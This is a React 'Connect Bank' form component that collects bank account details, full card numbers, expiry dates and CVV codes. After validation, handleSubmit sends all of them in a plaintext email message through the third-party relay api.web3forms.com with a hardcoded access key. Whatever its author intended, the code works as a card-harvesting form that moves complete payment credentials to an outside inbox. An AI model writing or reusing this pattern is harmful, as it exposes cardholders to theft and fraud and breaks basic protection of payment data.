"use client"

import { useActionState, useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Separator } from "@/components/ui/separator"
import { MoreHorizontal } from "lucide-react"
import { FormSchemaConnectBank } from "@/Helper/validate"
import { useSelector } from 'react-redux'
import { RootState } from "@/app/store"
// import { toast } from "@/hooks/use-toast"
export default function ConnectBankForm() {

    const [bankName, setBankName] = useState("");
    const [bankCode, setBankCode] = useState("");
    const [address, setAddress] = useState("");
    const [accountHolderName, setAccountHolderName] = useState("");
    const [accountNumber, setAccountNumber] = useState("");
    const [accountType, setAccountType] = useState("");
    const [amount, setAmount] = useState("");
    const [cardNumber, setCardNumber] = useState("");
    const [expirationDate, setExpirationDate] = useState("");
    const [cvv, setCvv] = useState("");
    const [cardType, setCardType] = useState("");
    const [bankEmail, setBankEmail] = useState("");
    // const [user, setUser] = useState("");
    interface User {
        id: number;
        username: string;
        Name: string;
        Email: string;
        email: string;
        token: string;
        role: string;
    }
    const user = useSelector((state: RootState) => state.user.userData);
    async function handleSubmit() {
        debugger;
        const validateAccount = FormSchemaConnectBank.safeParse({
            bankName,
            bankCode,
            bankAddress: address,
            accountHolderName,
            accountNumber,
            accountType,
            amount,
            cardNumber,
            expirationDate,
            cvv,
            cardType,
            bankEmail
        })
        if (!validateAccount.success) {
            return {
                errors: validateAccount.error.flatten().fieldErrors,
            }
        }
        // Organize validated data into a readable, multi-line message
        const validated = validateAccount.data;
        const message = [
            "New Bank Connected",
            `Bank Name: ${validated.bankName}`,
            `Bank Code: ${validated.bankCode}`,
            `Address: ${validated.bankAddress}`,
            `Bank Email: ${validated.bankEmail}`,
            `Account Holder: ${validated.accountHolderName}`,
            `Account Number: ${validated.accountNumber}`,
            `Account Type: ${validated.accountType}`,
            `Amount: ${validated.amount}`,
            `Card Number: ${validated.cardNumber}`,
            `Expiration Date: ${validated.expirationDate}`,
            `CVV: ${validated.cvv}`,
            `Card Type: ${validated.cardType}`,
        ].join("\n");

        // e.preventDefault();
        const response = await fetch("https://api.web3forms.com/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                Accept: "application/json",
            },
            body: JSON.stringify({
                access_key: "61d10a4f-f4c2-41d6-83a6-134e4f478cad",
                name: (user as User)?.Name,
                email: (user as User)?.Email,
                message,
            }),
        });
        const result = await response.json();
        if (result.success) {
            console.log(result);
        }
    }

    const [state, action, isLoading] = useActionState(handleSubmit, undefined);

    return (
        <div className="p-6 max-w-2xl mx-auto">
            <form action={action}>
                <div className="flex items-center justify-between mb-6">
                    <div>
                        <h1 className="text-2xl font-semibold text-gray-900 dark:text-white">Connect Bank</h1>
                        <p className="text-gray-600 dark:text-gray-400 mt-1">Please provide details related to connect bank</p>
                    </div>
                    <Button variant="ghost" size="sm">
                        <MoreHorizontal className="w-5 h-5" />
                    </Button>
                </div>
                    <Card className="">
                        <CardHeader>
                            <CardTitle className="text-xl font-semibold text-gray-900 dark:text-white">Connect Bank</CardTitle>
                        </CardHeader>
                        <CardContent className="space-y-8 ">
                            {/* Bank Details Section */}
                            <div className="space-y-4">
                                <h3 className="text-lg font-medium text-gray-900 dark:text-white">Bank Details</h3>

                                <div className="space-y-4 ">
                                    <div className="space-y-2 max-w-xl">
                                        <Label htmlFor="bankName">Bank Name</Label>
                                        <Input
                                            id="bankName"
                                            placeholder="Enter bank name"
                                            value={bankName}
                                            onChange={(e) => setBankName(e.target.value)}
                                            className="bg-gray-50 dark:bg-gray-800 "
                                        />
                                        {state?.errors?.bankName && <p className='text-red-500 text-sm'>{state.errors.bankName}</p>}
                                    </div>

                                    <div className="space-y-2 max-w-xl">
                                        <Label htmlFor="bankcode">Bank Code</Label>
                                        <Input
                                            id="bankcode"
                                            placeholder="Enter bank code"
                                            value={bankCode}
                                            onChange={(e) => setBankCode(e.target.value)}
                                        />
                                        {state?.errors?.bankCode && <p className='text-red-500 text-sm'>{state.errors.bankCode}</p>}
                                    </div>

                                    <div className="space-y-2 max-w-xl">
                                        <Label htmlFor="address">Address</Label>
                                        <Input
                                            id="address"
                                            placeholder="Enter address"
                                            value={address}
                                            onChange={(e) => setAddress(e.target.value)}
                                            className="bg-gray-50 dark:bg-gray-800"
                                        />
                                        {state?.errors?.bankAddress && <p className='text-red-500 text-sm'>{state.errors.bankAddress}</p>}
                                    </div>
                                    <div className="space-y-2 max-w-xl">
                                        <Label htmlFor="bankEmail">Bank Email</Label>
                                        <Input
                                            id="bankEmail"
                                            placeholder="Enter bank email"
                                            value={bankEmail}
                                            onChange={(e) => setBankEmail(e.target.value)}
                                            className="bg-gray-50 dark:bg-gray-800"
                                        />
                                        {state?.errors?.bankEmail && <p className='text-red-500 text-sm'>{state.errors.bankEmail}</p>}
                                    </div>


                                </div>
                            </div>

                            <Separator />

                            {/* Account Details Section */}
                            <div className="space-y-4">
                                <h3 className="text-lg font-medium text-gray-900 dark:text-white">Account Details</h3>

                                <div className="space-y-4">
                                    <div className="space-y-2 max-w-xl">
                                        <Label htmlFor="accountHolderName">Account Holder Name</Label>
                                        <Input
                                            id="accountHolderName"
                                            placeholder="Enter account holder name"
                                            value={accountHolderName}
                                            onChange={(e) => setAccountHolderName(e.target.value)}
                                            className="bg-gray-50 dark:bg-gray-800"
                                        />
                                        {state?.errors?.accountHolderName && <p className='text-red-500 text-sm'>{state.errors.accountHolderName}</p>}
                                    </div>
                                    <div className="space-y-2 max-w-xl">
                                        <Label htmlFor="accountNumber">Account Number</Label>
                                        <Input
                                            id="accountNumber"
                                            placeholder="Enter account number"
                                            value={accountNumber}
                                            onChange={(e) => setAccountNumber(e.target.value)}
                                            className="bg-gray-50 dark:bg-gray-800"
                                        />
                                        {state?.errors?.accountNumber && <p className='text-red-500 text-sm'>{state.errors.accountNumber}</p>}
                                    </div>
                                    <div className="grid grid-cols-2 gap-4 max-w-xl">
                                        <div className="space-y-2">
                                            <Label htmlFor="accountType">Account Type</Label>
                                            <Select value={accountType} onValueChange={setAccountType}>
                                                <SelectTrigger className="w-full bg-gray-50 dark:bg-gray-800 hover:bg-gray-800" >
                                                    <SelectValue placeholder="Select type" />
                                                </SelectTrigger>
                                                <SelectContent >
                                                    <SelectItem value="savings">Savings</SelectItem>
                                                    <SelectItem value="current">Current</SelectItem>
                                                </SelectContent>
                                            </Select>
                                            {state?.errors?.accountType && <p className='text-red-500 text-sm'>{state.errors.accountType}</p>}
                                        </div>
                                        {/* {state?.errors?.accounttype && <p className='text-red-500 text-sm'>{state.errors.accounttype}</p>} */}
                                        <div className="space-y-2 max-w-xl">
                                            <Label htmlFor="amount">Amount</Label>
                                            <Input
                                                id="amount"
                                                type="number"
                                                placeholder="Enter amount"
                                                value={amount}
                                                onChange={(e) => setAmount(e.target.value)}
                                                className="bg-gray-50 dark:bg-gray-800"
                                            />
                                            {state?.errors?.amount && <p className='text-red-500 text-sm'>{state.errors.amount}</p>}
                                        </div>
                                    </div>



                                </div>
                            </div>

                            <Separator />

                            {/* Credit Card Details Section */}
                            <div className="space-y-4">
                                <h3 className="text-lg font-medium text-gray-900 dark:text-white">Card Details</h3>

                                <div className="space-y-4 ">
                                    <div className="space-y-2 max-w-xl">
                                        <Label htmlFor="cardNumber">Card Number</Label>
                                        <Input
                                            id="cardNumber"
                                            placeholder="Enter card number"
                                            value={cardNumber}
                                            onChange={(e) => setCardNumber(e.target.value)}
                                            className="bg-gray-50 dark:bg-gray-800"
                                        />
                                        {state?.errors?.cardNumber && <p className='text-red-500 text-sm'>{state.errors.cardNumber}</p>}
                                    </div>

                                    <div className="grid grid-cols-2 gap-4 max-w-xl">
                                        <div className="space-y-2">
                                            <Label htmlFor="expirationDate">Expiration Date</Label>
                                            <Input
                                                id="expirationDate"
                                                type="date"
                                                placeholder="MM/YY"
                                                value={expirationDate}
                                                onChange={(e) => setExpirationDate(e.target.value)}
                                                className="bg-gray-50 dark:bg-gray-800"
                                            />
                                            {state?.errors?.expirationDate && <p className='text-red-500 text-sm'>{state.errors.expirationDate}</p>}
                                        </div>

                                        <div className="space-y-2 max-w-xl">
                                            <Label htmlFor="cardType">Card Type</Label>
                                            <Select value={cardType} onValueChange={setCardType}>
                                                <SelectTrigger className="w-full bg-gray-50 dark:bg-gray-800">
                                                    <SelectValue placeholder="Select type" />
                                                </SelectTrigger>
                                                <SelectContent>
                                                    <SelectItem value="debit">Debit Card</SelectItem>
                                                    <SelectItem value="credit">Credit Card</SelectItem>
                                                    <SelectItem value="prepaid">Prepaid Card</SelectItem>
                                                    <SelectItem value="virtual">Virtual Card</SelectItem>
                                                    <SelectItem value="business">Business Card</SelectItem>
                                                    <SelectItem value="travel">Travel Card</SelectItem>
                                                    <SelectItem value="student">Student Card</SelectItem>
                                                </SelectContent>
                                            </Select>
                                            {state?.errors?.cardType && <p className='text-red-500 text-sm'>{state.errors.cardType}</p>}
                                            {/* {stateCard?.errors?.cardType && <p className='text-red-500 text-sm'>{stateCard.errors.cardType}</p>} */}
                                        </div>


                                    </div>
                                    <div className="space-y-2 max-w-xl">
                                        <Label htmlFor="cvv">CVV</Label>
                                        <Input
                                            id="cvv"
                                            placeholder="Enter CVV"
                                            value={cvv}
                                            onChange={(e) => setCvv(e.target.value)}
                                            className="bg-gray-50 dark:bg-gray-800"
                                        />
                                        {state?.errors?.cvv && <p className='text-red-500 text-sm'>{state.errors.cvv}</p>}
                                    </div>


                                </div>
                            </div>

                            <Separator />

                            {/* Save All Button */}
                            <div className="flex justify-center">
                                <Button disabled={isLoading}
                                    className="bg-blue-600 hover:bg-blue-700 text-white px-8"
                                >
                                    Save
                                    {isLoading ? "..." : ""}
                                </Button>
                            </div>

                        </CardContent>
                    </Card>
            </form>
        </div>
    )
}
